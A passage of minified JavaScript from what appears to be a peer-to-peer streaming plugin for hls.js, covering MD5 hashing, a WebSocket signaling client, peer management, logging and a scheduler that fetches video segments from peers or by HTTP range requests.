e[n + 15], 16, 530742520), h = c(h, g, p, d, e[n + 2], 23, -995338651), d = f(d, h, g, p, e[n], 6, -198630844), p = f(p, d, h, g, e[n + 7], 10, 1126891415), g = f(g, p, d, h, e[n + 14], 15, -1416354905), h = f(h, g, p, d, e[n + 5], 21, -57434055), d = f(d, h, g, p, e[n + 12], 6, 1700485571), p = f(p, d, h, g, e[n + 3], 10, -1894986606), g = f(g, p, d, h, e[n + 10], 15, -1051523), h = f(h, g, p, d, e[n + 1], 21, -2054922799), d = f(d, h, g, p, e[n + 8], 6, 1873313359), p = f(p, d, h, g, e[n + 15], 10, -30611744), g = f(g, p, d, h, e[n + 6], 15, -1560198380), h = f(h, g, p, d, e[n + 13], 21, 1309151649), d = f(d, h, g, p, e[n + 4], 6, -145523070), p = f(p, d, h, g, e[n + 11], 10, -1120210379), g = f(g, p, d, h, e[n + 2], 15, 718787259), h = f(h, g, p, d, e[n + 9], 21, -343485551), d = o(d, r), h = o(h, i), g = o(g, s), p = o(p, a);
                return [d, h, g, p]
            }

            function h(e) {
                var t, n = "",
                    r = 32 * e.length;
                for (t = 0; t < r; t += 8) n += String.fromCharCode(e[t >> 5] >>> t % 32 & 255);
                return n
            }

            function g(e) {
                var t, n = [];
                for (n[(e.length >> 2) - 1] = void 0, t = 0; t < n.length; t += 1) n[t] = 0;
                var r = 8 * e.length;
                for (t = 0; t < r; t += 8) n[t >> 5] |= (255 & e.charCodeAt(t / 8)) << t % 32;
                return n
            }

            function p(e) {
                return h(d(g(e), 8 * e.length))
            }

            function v(e, t) {
                var n, r, i = g(e),
                    o = [],
                    s = [];
                for (o[15] = s[15] = void 0, i.length > 16 && (i = d(i, 8 * e.length)), n = 0; n < 16; n += 1) o[n] = 909522486 ^ i[n], s[n] = 1549556828 ^ i[n];
                return r = d(o.concat(g(t)), 512 + 8 * t.length), h(d(s.concat(r), 640))
            }

            function y(e) {
                var t, n, r = "0123456789abcdef",
                    i = "";
                for (n = 0; n < e.length; n += 1) t = e.charCodeAt(n), i += r.charAt(t >>> 4 & 15) + r.charAt(15 & t);
                return i
            }

            function b(e) {
                return unescape(encodeURIComponent(e))
            }

            function m(e) {
                return p(b(e))
            }

            function _(e) {
                return y(m(e))
            }

            function P(e, t) {
                return v(b(e), b(t))
            }

            function w(e, t) {
                return y(P(e, t))
            }

            function S(e, t, n) {
                return t ? n ? P(t, e) : w(t, e) : n ? m(e) : _(e)
            }
            void 0 !== (r = function() {
                return S
            }.call(t, n, t, e)) && (e.exports = r)
        }()
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function o(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function s(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var a = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            u = n(1),
            l = r(u),
            c = n(28),
            f = r(c),
            d = n(0),
            h = 60,
            g = function(e) {
                function t(e, n, r, s) {
                    var a = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : "ws";
                    i(this, t);
                    var u = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this));
                    return u.engine = e, u.logger = e.logger, u.config = r, u.wsAddr = n, u.connected = !1, u.connecting = !1, u.serverVersion = 0, u.pingInterval = s || h, u._ws = u._init(), u.name = a, u
                }
                return s(t, e), a(t, [{
                    key: "_init",
                    value: function() {
                        var e = this,
                            t = {
                                maxRetries: this.config.wsMaxRetries,
                                minReconnectionDelay: 1e3 * (0, d.randomNum)(15, 40),
                                maxReconnectionDelay: 6e5
                            },
                            n = new f.default(this.wsAddr, void 0, t);
                        return n.onopen = function() {
                            e.logger.info(e.name + " " + e.wsAddr + " connection opened"), e.connected = !0, e.connecting = !1, e.onopen && e.onopen(), e._startPing(e.pingInterval)
                        }, n.push = n.send, n.send = function(e) {
                            var t = JSON.stringify(e);
                            n.push(t)
                        }, n.onmessage = function(t) {
                            var n = t.data,
                                r = JSON.parse(n),
                                i = r.action;
                            return "pong" === i ? void clearTimeout(e.pongTimer) : "ver" === i ? void(e.serverVersion = r.ver) : void(e.onmessage && e.onmessage(r))
                        }, n.onclose = function(t) {
                            e.logger.warn(e.name + " " + e.wsAddr + " closed " + t.code + " " + t.reason), e.onclose && e.onclose(), e.connected = !1, e.connecting = !1, e._stopPing(), 1e3 === t.code || (e.connecting = !0)
                        }, n.onerror = function(t) {
                            e.logger.error(e.name + " " + e.wsAddr + " error"), e.connecting = !1, e._stopPing(), e.onerror && e.onerror(t)
                        }, n
                    }
                }, {
                    key: "sendSignal",
                    value: function(e, t) {
                        var n = {
                            action: "signal",
                            to_peer_id: e,
                            data: t
                        };
                        this._send(n)
                    }
                }, {
                    key: "sendReject",
                    value: function(e, t, n) {
                        var r = {
                            action: "reject",
                            to_peer_id: e,
                            reason: t,
                            fatal: n
                        };
                        this._send(r)
                    }
                }, {
                    key: "_send",
                    value: function(e) {
                        this.connected && this._ws ? this._ws.send(e) : this.logger.warn(this.name + " closed, send msg " + JSON.stringify(e) + " failed")
                    }
                }, {
                    key: "_startPing",
                    value: function() {
                        var e = this,
                            t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 120;
                        this.connected && this._ws && (this.pingTimer = setInterval(function() {
                            var t = {
                                action: "ping"
                            };
                            e._send(t), "signaler" === e.name && e.serverVersion >= 22 && e._waitForPong()
                        }, 1e3 * t))
                    }
                }, {
                    key: "_waitForPong",
                    value: function() {
                        var e = this;
                        this.pongTimer = setTimeout(function() {
                            e.logger.warn(e.name + " wait for pong timeout, reconnect"), e.close(), e.reconnect()
                        }, 15e3)
                    }
                }, {
                    key: "_resetPing",
                    value: function() {
                        this._stopPing(), this._startPing(this.pingInterval)
                    }
                }, {
                    key: "_stopPing",
                    value: function() {
                        clearInterval(this.pingTimer), clearTimeout(this.pongTimer), this.pingTimer = null, this.pongTimer = null
                    }
                }, {
                    key: "close",
                    value: function() {
                        this.logger.info("close " + this.name), this._stopPing(), this.connected && (this.connected = !1, this._ws && this._ws.close(1e3, "normal close", {
                            keepClosed: !0
                        }))
                    }
                }, {
                    key: "reconnect",
                    value: function() {
                        this.connected || this.connecting || !this._ws || (this.connecting = !0, this.logger.info("reconnect " + this.name + " client"), this._ws = this._init())
                    }
                }, {
                    key: "destroy",
                    value: function() {
                        this.close(), this._ws = null, this.removeAllListeners()
                    }
                }]), t
            }(l.default);
        t.default = g, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e, t) {
            for (var n in t) Object.defineProperty(e, n, {
                value: t[n],
                enumerable: !0,
                configurable: !0
            });
            return e
        }

        function i(e, t, n) {
            if (!e || "string" == typeof e) throw new TypeError("Please pass an Error to err-code");
            n || (n = {}), "object" === (void 0 === t ? "undefined" : o(t)) && (n = t, t = void 0), null != t && (n.code = t);
            try {
                return r(e, n)
            } catch (t) {
                n.message = e.message, n.stack = e.stack;
                var i = function() {};
                return i.prototype = Object.create(Object.getPrototypeOf(e)), r(new i, n)
            }
        }
        var o = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
            return typeof e
        } : function(e) {
            return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
        };
        e.exports = i
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            if (Array.isArray(e)) {
                for (var t = 0, n = Array(e.length); t < e.length; t++) n[t] = e[t];
                return n
            }
            return Array.from(e)
        }

        function i(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var o = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            s = function() {
                function e() {
                    i(this, e), this.peerMap = new Map
                }
                return o(e, [{
                    key: "isEmpty",
                    value: function() {
                        return 0 === this.peerMap.size
                    }
                }, {
                    key: "size",
                    value: function() {
                        return this.peerMap.size
                    }
                }, {
                    key: "clear",
                    value: function() {
                        this.peerMap.clear()
                    }
                }, {
                    key: "getPeers",
                    value: function() {
                        return [].concat(r(this.peerMap.values()))
                    }
                }, {
                    key: "getPeerValues",
                    value: function() {
                        return this.peerMap.values()
                    }
                }, {
                    key: "hasPeer",
                    value: function(e) {
                        return this.peerMap.has(e)
                    }
                }, {
                    key: "addPeer",
                    value: function(e, t) {
                        this.peerMap.set(e, t)
                    }
                }, {
                    key: "getPeerIds",
                    value: function() {
                        return [].concat(r(this.peerMap.keys()))
                    }
                }, {
                    key: "removePeer",
                    value: function(e) {
                        this.peerMap.delete(e)
                    }
                }, {
                    key: "getPeersOrderByWeight",
                    value: function() {
                        var e = this.getPeers().filter(function(e) {
                            return e.isAvailableUrgently
                        });
                        return e.sort(function(e, t) {
                            return 0 === t.weight ? 1 : 0 === e.weight ? -1 : t.weight - e.weight
                        }), e
                    }
                }, {
                    key: "getPeer",
                    value: function(e) {
                        return this.peerMap.get(e)
                    }
                }, {
                    key: "getAvailablePeers",
                    value: function() {
                        return this.getPeers().filter(function(e) {
                            return e.isAvailable
                        })
                    }
                }]), e
            }();
        t.default = s, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var i = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            o = n(0),
            s = {
                debug: 0,
                info: 1,
                warn: 2,
                error: 3,
                none: 4
            },
            a = function() {
                function e(t) {
                    r(this, e), this.config = t, console.debug = console.log, "debug" !== t.logLevel && "info" !== t.logLevel || (t.logLevel = "warn"), !0 === t.logLevel ? t.logLevel = "warn" : !1 === t.logLevel ? t.logLevel = "none" : t.logLevel in s || (t.logLevel = "error");
                    for (var n in s) s[n] < s[t.logLevel] ? this[n] = o.noop : this[n] = console[n]
                }
                return i(e, [{
                    key: "enableDebug",
                    value: function() {
                        for (var e in s) this[e] = console[e]
                    }
                }, {
                    key: "isDebugLevel",
                    get: function() {
                        return s[this.config.logLevel] <= 1
                    }
                }]), e
            }();
        t.default = a, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function o(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function s(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var a = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            u = function e(t, n, r) {
                null === t && (t = Function.prototype);
                var i = Object.getOwnPropertyDescriptor(t, n);
                if (void 0 === i) {
                    var o = Object.getPrototypeOf(t);
                    return null === o ? void 0 : e(o, n, r)
                }
                if ("value" in i) return i.value;
                var s = i.get;
                if (void 0 !== s) return s.call(r)
            },
            l = n(2),
            c = n(9),
            f = r(c),
            d = n(15),
            h = r(d),
            g = n(0),
            p = 2,
            v = function(e) {
                function t(e, n) {
                    i(this, t);
                    var r = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n));
                    return r.targetPeers = [], r.mBufferedDuration = 0, r.loadingSegId = "", r.allowP2pLimit = n.httpLoadTime + p, r.playlistInfo = new Map, r.subscribeMode = !1, r.subscribeLevel = 0, r.subscribers = [], r.subscribeParent = null, r.subscriberEdgeSN = 0, r.isUploader = !1, r.isReceiver = !1, r
                }
                return s(t, e), a(t, [{
                    key: "hasAndSetTargetPeer",
                    value: function(e) {
                        var t = this.logger,
                            n = this.config;
                        if (this.criticalSeg && t.warn("scheduler still loading " + JSON.stringify(this.criticalSeg)), this.waitForPeer) {
                            if (this.peersHas(e)) {
                                var r = !0,
                                    i = !1,
                                    o = void 0;
                                try {
                                    for (var s, a = this.peerManager.getAvailablePeers()[Symbol.iterator](); !(r = (s = a.next()).done); r = !0) {
                                        var u = s.value;
                                        if (u.bitset.has(e)) return t.info("found " + e + " from peer " + u.remotePeerId), this.targetPeers.push(u), !0
                                    }
                                } catch (e) {
                                    i = !0, o = e
                                } finally {
                                    try {
                                        !r && a.return && a.return()
                                    } finally {
                                        if (i) throw o
                                    }
                                }
                            }
                            return 0 !== this.waitingPeers && this.waitingPeers === this.peersNum ? (t.info("all connected no need wait"), !1) : (t.warn("wait for peer to load " + e), this.requestingMap.setPeerUnknown(e), !0)
                        }
                        var l = this.bufferedDuration;
                        if (this.subscribeMode) {
                            var c = this.subscribeParent,
                                f = c.remotePeerId;
                            return c.bitset.has(e) ? c.downloading ? this._searchAvailablePeers(e) : (t.info("found " + e + " from parent " + f), this.targetPeers.push(this.subscribeParent), !0) : !(l <= 3.5) && (t.info("under subscribe to " + f), this.requestingMap.set(e, f), !0)
                        }
                        if (l <= this.allowP2pLimit) return !1;
                        if (this.requestingMap.has(e)) {
                            var d = this.requestingMap.getOnePeerId(e),
                                h = this.peerManager.getPeer(d);
                            return h ? !(performance.now() - h.timeSendRequest > 3e3 && !h.shouldWaitForRemain(1e3 * (l - n.httpLoadTime)) && this._searchAvailablePeers(e, 1)) || (t.warn(d + " prefetch timeout at " + e), this.targetPeers.push(h), this.requestingMap.delete(e), !0) : this._searchAvailablePeers(e)
                        }
                        return this._searchAvailablePeers(e)
                    }
                }, {
                    key: "_searchAvailablePeers",
                    value: function(e) {
                        var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 5;
                        if (!this.hasIdlePeers || !this.peersHas(e)) return !1;
                        var n = 0,
                            r = !0,
                            i = !1,
                            o = void 0;
                        try {
                            for (var s, a = this.peerManager.getPeersOrderByWeight()[Symbol.iterator](); !(r = (s = a.next()).done); r = !0) {
                                var u = s.value;
                                if (u.bitset.has(e) && (this.logger.info("found " + e + " from peer " + u.remotePeerId), this.targetPeers.push(u), ++n === t || n === this.config.simultaneousTargetPeers)) return !0
                            }
                        } catch (e) {
                            i = !0, o = e
                        } finally {
                            try {
                                !r && a.return && a.return()
                            } finally {
                                if (i) throw o
                            }
                        }
                        return this.targetPeers.length > 0
                    }
                }, {
                    key: "notifyAllPeers",
                    value: function(e, t) {
                        var n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : [],
                            r = this.config.live,
                            i = t;
                        if (this.sequential && (i = e), !this.bitset.has(i)) {
                            var o = !0,
                                s = !1,
                                a = void 0;
                            try {
                                for (var u, l = this.peerManager.getPeerValues()[Symbol.iterator](); !(o = (u = l.next()).done); o = !0) {
                                    var c = u.value;
                                    if (!c.bitset.has(i)) {
                                        if (r && (this.subscribers.includes(c.remotePeerId) || this.subscribeParent && c.remotePeerId === this.subscribeParent.remotePeerId)) continue;
                                        n.includes(c.remotePeerId) || (c.sendMsgHave(e, t), c.bitset.add(i))
                                    }
                                }
                            } catch (e) {
                                s = !0, a = e
                            } finally {
                                try {
                                    !o && l.return && l.return()
                                } finally {
                                    if (s) throw a
                                }
                            }
                        }
                    }
                }, {
                    key: "updateLoaded",
                    value: function(e) {
                        this.bitset.has(e) || (this.bitset.add(e), this.bitCounts.has(e) && this.bitCounts.delete(e))
                    }
                }, {
                    key: "deletePeer",
                    value: function(e) {
                        var n = this;
                        this.peerManager.hasPeer(e.remotePeerId) && e.bitset.forEach(function(e) {
                            n._decreBitCounts(e)
                        }), this.cleanRequestingMap(e.remotePeerId), u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "deletePeer", this).call(this, e)
                    }
                }, {
                    key: "_setupDC",
                    value: function(e) {
                        var n = this;
                        u(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "_setupDC", this).call(this, e);
                        this.logger;
                        e.on(f.default.DC_METADATA, function(t) {
                            t.field && (e.bitset = new Set(t.field), t.field.forEach(function(e) {
                                n.bitset.has(e) || n._increBitCounts(e)
                            }), n.addPeer(e), n.downloadOnly && n.chokePeerRequest(e))
                        }).on(f.default.DC_PIECE, function(e) {
                            n.criticalSeg && n.criticalSeg.segId === e.seg_id && (n.stats.tfirst = Math.max(performance.now(), n.stats.trequest))
                        })
                    }
                }, {
                    key: "loadRemainBufferByHttp",
                    value: function(e) {
                        var t = this,
                            n = l.Buffer.concat(e.bufArr),
                            r = "bytes=";
                        if (this.context.rangeEnd) {
                            var i = Number(this.context.rangeStart),
                                o = Number(this.context.rangeEnd);
                            r = "" + r + (i + n.byteLength) + "-" + (o - 1)
                        } else r = "" + r + n.byteLength + "-";
                        this.logger.info("continue download from " + this.context.frag.url + " range: " + r), fetch(this.context.frag.url, {
                            headers: {
                                Range: r
                            }
                        }).then(function(e) {
                            return e.arrayBuffer()
                        }).then(function(r) {
                            var i = l.Buffer.from(r);
                            t.engine.fetcher.reportFlow(i.byteLength);
                            var o = l.Buffer.concat([n, i]),
                                s = new Uint8Array(o).buffer,
                                a = t.stats;
                            a.tfirst = a.loading.first = Math.max(a.trequest, performance.now()), a.tload = a.loading.end = a.tfirst, a.loaded = a.total = o.byteLength;
                            var u = t.context.frag;
                            u.fromPeerId = e.remotePeerId, u.loadByP2P = !0, t.callbacks.onSuccess({
                                data: s
                            }, a, t.context)
                        }).catch(function(e) {
                            t.logger.error("http partial download error " + e), t.callbacks.onTimeout(t.stats, t.context, null)
                        })
                    }
                }, {
                    key: "broadcastPlaylist",
                    value: function(e, t) {
                        if (this.config.live) {
                            var n = !0,
                                r = !1,
                                i = void 0;
                            try {
                                for (var o, s = this.peerManager.getPeerValues()[Symbol.iterator](); !(n = (o = s.next()).done); n = !0) {
                                    o.value.sendMsgPlaylist(e, t)
                                }
                            } catch (e) {
                                r = !0, i = e
                            } finally {
                                try {
                                    !n && s.return && s.return()
                                } finally {
                                    if (r) throw i
                                }
                            }
                            var a = (0, g.getCurrentTs)(),
                                u = (0, h.default)(t);
                            this.playlistInfo.set(e, {
                                hash: u,
                                ts: a
                            })
                        }
                    }
                }, {
                    key: "getPlaylistFromPeer",
                    value: function(e) {
                        if (!this.config.live) return null;
                        var t = this.playlistInfo.get(e),
                            n = t.ts,
                            r = t.hash,
                            i = !0,
                            o = !1,
                            s = void 0;
                        try {
                            for (var a, u = this.peerManager.getPeerValues()[Symbol.iterator](); !(i = (a = u.next()).done); i = !0) {
                                var l = a.value,
                                    c = l.getLatestPlaylist(e, n);
                                if (c) {
                                    var f = (0, h.default)(c.data);
                                    if (r !== f) return this.playlistInfo.set(e, {
                                        hash: f,
                                        ts: c.ts
                                    }), c
                                }
                            }
                        } catch (e) {
                            o = !0, s = e
                        } finally {
                            try {
                                !i && u.return && u.return()
                            } finally {
                                if (o) throw s
                            }
                        }
                        return null
                    }
                }, {
                    key: "_handlePieceAborted",
                    value: function(e) {
                        this.criticalSeg && this.criticalSeg.targetPeers.includes(e) ? 1 === this.criticalSeg.targetPeers.length ? (clearTimeout(this.criticaltimeouter), this.criticaltimeout(), this.cleanRequestingMap(e)) : this.criticalSeg.targetPeers = this.criticalSeg.targetPeers.filter(function(t) {
                            return t !== e
                        }) : this.cleanRequestingMap(e)
                    }
                }, {
                    key: "criticaltimeout",
                    value: function() {
                        var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
                            t = this.logger,
                            n = this.config;
                        if (this.waitForPeer && (this.waitForPeer = !1), this.criticalSeg) {
                            var r = this.criticalSeg.sn,
                                i = this.criticalSeg.segId;
                            this.sequential && (i = r), t.info("critical request sn " + i + " timeout");
                            var o = void 0;
                            this.subscribeMode ? o = this.subscribeParent : this.requestingMap.has(i) && (o = this.getPeerLoadedMore(i));
                            var s = 1e3 * n.httpLoadTime;
                            if (e && o && o.shouldWaitForRemain(s - 200)) return t.info("wait for peer load remain of " + r), void(this.criticaltimeouter = setTimeout(this.criticaltimeout.bind(this), s));
                            n.httpRangeSupported && o && o.bufArr.length > 0 ? this.loadRemainBufferByHttp(o) : this.callbacks.onTimeout(this.stats, this.context, null), o && o.loadtimeout(), this.requestingMap.delete(i), n.live && o && o.resetContinuousHits(), this.subscribeParent && this._unsubscribe("subscribe timeout for " + r), this.criticalSeg = null, this.criticaltimeouter = null
                        }
                    }
                }, {
                    key: "shouldWaitForNextSeg",
                    value: function() {
                        var e = !1;
                        return e = !(this.subscribers.length > 0 || this.isUploader) && (!!this.isReceiver || (0, g.randomNum)(0, 100) > 20), this.isReceiver = this.isUploader = !1, e
                    }
                }, {
                    key: "bufferedDuration",
                    get: function() {
                        for (var e = this.engine.media, t = 0, n = e.currentTime, r = e.buffered, i = r.length - 1; i >= 0; i--)
                            if (n >= r.start(i) && n <= r.end(i)) {
                                t = r.end(i) - n;
                                break
                            } return this.logger.info("bufferedDuration " + t), this.mBufferedDuration = t, t > 0 ? t : 0
                    }
                }]), t
            }(l.BtScheduler);
        t.default = v, e.exports = t.default
    }, function(e, t, n) {
        "use strict";

        function r(e) {
            return e && e.__esModule ? e : {
                default: e
            }
        }

        function i(e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
        }

        function o(e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t
        }

        function s(e, t) {
            if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
            e.prototype = Object.create(t && t.prototype, {
                constructor: {
                    value: e,
                    enumerable: !1,
                    writable: !0,
                    configurable: !0
                }
            }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : e.__proto__ = t)
        }
        Object.defineProperty(t, "__esModule", {
            value: !0
        });
        var a = Object.assign || function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var n = arguments[t];
                    for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
                }
                return e
            },
            u = function() {
                function e(e, t) {
                    for (var n = 0; n < t.length; n++) {
                        var r = t[n];
                        r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                    }
                }
                return function(t, n, r) {
                    return n && e(t.prototype, n), r && e(t, r), t
                }
            }(),
            l = n(6),
            c = r(l),
            f = n(22),
            d = r(f),
            h = n(34),
            g = r(h),
            p = n(35),
            v = r(p),
            y = n(2),
            b = n(4),
            m = n(0),
            _ = n(5),
            P = n(36),
            w = r(P),
            S = n(12),
            C = r(S);
        if (window.p2ploadedHls) throw new Error("P2P plugin is loaded before");
        window.p2ploadedHls = !0;
        var E = function(e) {
            function t(e) {
                var n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                i(this, t);
                var r = o(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, n));
                r.config = Object.assign({}, d.default, n), r.rangeTested = !1, e.config.segmentId = r.config.segmentId, r.hlsjs = e, r.p2pEnabled = !(!1 === r.config.p2pEnabled || "0" === (0, m.getQueryParam)("_p2p")), r.HLSEvents = e.constructor.Events, r.config.isHlsV0 = "0" === e.constructor.version.split(".")[0];
                var s = function n(i, o) {
                    var s = o.details,
                        u = s.live;
                    r.config.live = r.hlsjs.config.live = u, r.config.startSN = s.startSN, r.config.endSN = s.endSN;
                    var l = b.platform.getPlatform();
                    r.netType = b.platform.getNetType() || void 0, r.netType || (r.netType = "wifi"), r.browserInfo = {
                        device: l,
                        netType: r.netType,
                        tag: r.config.tag || e.constructor.version + "-" + b.platform.getBrowser(),
                        live: u,
                        type: "hls"
                    }, l === b.platform.device.PC_NATIVE && (r.browserInfo = a({}, r.browserInfo, {
                        app: r.config.appName,
                        bundle: r.config.appId
                    })), !1 !== r.config.useHttpRange && u && (r.config.useHttpRange = !0);
                    var f = r.config,
                        d = f.channelIdPrefix,
                        h = f.channelId,
                        g = function(e, t) {
                            var n = c.default.parseURL(e);
                            return "" + (n.netLoc.substr(2) + n.path.substring(0, n.path.lastIndexOf(".")))
                        };
                    h && "function" == typeof h && (g = r.makeChannelId(d, h));
                    var p = r.makeSignalId();
                    r.channel = g(e.url, r.browserInfo) + "|" + p + "[" + y.Peer.VERSION + "]";
                    var v = r.initLogger();
                    r.hlsjs.config.logger = v, v.info("P2P version: " + t.version + " Hlsjs version: " + e.constructor.version), v.info("channel " + r.channel), r.eventListened = !1, r._init(r.channel, r.browserInfo), v.info("startSN " + s.startSN + " endSN " + s.endSN), e.off(r.HLSEvents.LEVEL_LOADED, n)
                };
                e.on(r.HLSEvents.LEVEL_LOADED, s);
                var u = function t(n, i) {
                    var o = i.levels.length;
                    r.multiBitrate = o > 1, e.off(r.HLSEvents.MANIFEST_PARSED, t)
                };
                return e.on(r.HLSEvents.MANIFEST_PARSED, u), r
            }
            return s(t, e), u(t, null, [{
                key: "Events",
                get: function() {
                    return y.Events
                }
            }]), u(t, [{
                key: "_init",
                value: function(e, t) {
                    if (this.p2pEnabled) {
                        var n = this.multiBitrate || this.config.scheduledBySegId;
                        this.hlsjs.config.p2pEnabled = this.p2pEnabled, this.hlsjs.config.sharePlaylist = this.config.sharePlaylist, this.bufMgr = new y.SegmentManager(this, this.config, !n), this.hlsjs.config.bufMgr = this.bufMgr, this.media = this.hlsjs.media;
                        var r = new y.Server(this, this.config.token, encodeURIComponent(e), this.config.announce || "", t);
                        this.fetcher = r;
                        var i = void 0;
                        i = n ? new C.default(this, this.config) : new w.default(this, this.config), this.tracker = new y.Tracker(this, r, i, this.config), i.bufferManager = this.bufMgr, this.hlsjs.config.fLoader = g.default, this.config.sharePlaylist && (this.hlsjs.config.pLoader = v.default), window.__p2p_loader__ = {
                            scheduler: this.tracker.scheduler,
                            fetcher: r,
                            p2pBlackList: this.config.p2pBlackList
                        }, this.trackerTried = !1, this.eventListened || (this.hlsjs.on(this.HLSEvents.FRAG_LOADING, this._onFragLoading.bind(this)), this.hlsjs.on(this.HLSEvents.FRAG_LOADED, this._onFragLoaded.bind(this)), this.hlsjs.on(this.HLSEvents.FRAG_CHANGED, this._onFragChanged.bind(this)), this.hlsjs.on(this.HLSEvents.ERROR, this._onHlsError.bind(this)), this.eventListened = !0), this.setupWindowListeners(), this.trackerTried || this.tracker.connected || !this.config.p2pEnabled || (this.tracker.resumeP2P(), this.trackerTried = !0)
                    }
                }
            }, {
                key: "_onFragLoading",
                value: function(e, t) {
                    var n = t.frag,
                        r = n.sn,
                        i = n.segId;
                    if (!(0, _.isBlockType)(n.url, this.config.p2pBlackList)) {
                        if (this.logger.debug("loading frag " + r), !i) {
                            var o = void 0;
                            n._byteRange && (o = "bytes=" + n._byteRange[0] + "-" + n._byteRange[1]);
                            var s = n.url;
                            i = t.frag.segId = this.config.segmentId(n.baseurl, n.sn, s, o)
                        }
                        this.emit(y.Events.FRAG_LOADING, r, i, t.frag.loadByHTTP)
                    }
                }
            }, {
                key: "_onFragLoaded",
                value: function(e, t) {
                    var n = t.frag,
                        r = n.sn,
                        i = n.segId,
                        o = n.loaded,
                        s = n.duration,
                        a = this.config,
                        u = this.logger;
                    (0, _.isBlockType)(t.frag.url, a.p2pBlackList) || (this.emit(y.Events.FRAG_LOADED, r, i, o, s), !this.rangeTested && a.useHttpRange && ((0, m.performRangeRequest)(t.frag.url).then(function() {
                        a.httpRangeSupported = !0, u.info("http range is supported"), a.httpLoadTime -= 1.5
                    }).catch(function() {
                        a.httpRangeSupported = !1, u.warn("http range is not supported")
                    }), this.rangeTested = !0))
                }
            }, {
                key: "_onFragChanged",
                value: function(e, t) {
                    if (!(0, _.isBlockType)(t.frag.url, this.config.p2pBlackList)) {
                        this.logger.debug("frag changed: " + t.frag.sn);
                        var n = t.frag,
                            r = n.sn,
                            i = n.duration;
                        this.emit(y.Events.FRAG_CHANGED, r, i)
                    }
                }
            }, {
                key: "_onHlsError",
                value: function(e, t) {
                    var n = this.logger;
                    t.fatal ? n.error(t.type + " details " + t.details + " reason " + t.reason) : n.warn(t.type + " details " + t.details + " reason " + t.reason);
                    var r = this.hlsjs.constructor.ErrorDetails;
                    switch (t.details) {
                        case r.BUFFER_STALLED_ERROR:
                            this.fetcher && this.fetcher.errsBufStalled++;
                            break;
